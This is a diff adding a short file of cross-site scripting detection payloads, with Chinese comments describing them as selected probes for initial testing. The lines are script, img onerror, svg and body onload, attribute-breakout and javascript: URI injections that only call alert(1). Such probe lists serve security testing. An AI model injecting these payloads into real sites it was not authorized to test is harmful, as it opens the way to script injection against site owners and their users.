@@ -1,0 +1,11 @@
+# XSS Quick Detection Payloads
+# 快速检测payload - 用于初步探测
+# 精选高效payload
+
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+javascript:alert(1)
+<body onload=alert(1)>
